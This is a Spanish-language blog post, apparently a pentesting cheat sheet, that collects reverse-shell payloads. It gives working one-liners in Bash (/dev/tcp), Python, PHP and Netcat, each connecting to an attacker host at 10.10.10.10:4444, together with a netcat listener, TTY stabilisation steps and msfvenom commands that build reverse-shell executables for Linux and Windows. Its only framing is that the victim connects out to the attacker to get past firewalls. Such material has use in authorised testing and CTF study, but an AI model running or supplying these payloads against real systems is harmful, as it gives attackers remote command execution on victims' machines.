---
layout: post
title: "Reverse Shell — Cheatsheet completo"
date: 2025-02-05
categories: [ciberseguridad]
tags: [reverse-shell, netcat, linux, explotación, msfvenom]
description: "Colección completa de reverse shells en Bash, Python, PHP, Netcat y PowerShell. Incluye técnicas de estabilización de TTY."
---

## Concepto

La víctima se conecta al atacante, evitando firewalls que bloquean conexiones entrantes.

**Escuchar en el atacante:**

```bash
nc -lnvp 4444
rlwrap nc -lnvp 4444   # Con historial de comandos
```

## Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Python 3

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP

```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Netcat

```bash
nc -e /bin/sh 10.10.10.10 4444

# Sin -e (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

## Estabilizar la shell (TTY)

```bash
# 1. En la shell recibida
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Ctrl+Z → en tu terminal:
stty raw -echo; fg

# 3. En la shell
export TERM=xterm
stty rows 38 cols 116
```

## msfvenom

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```
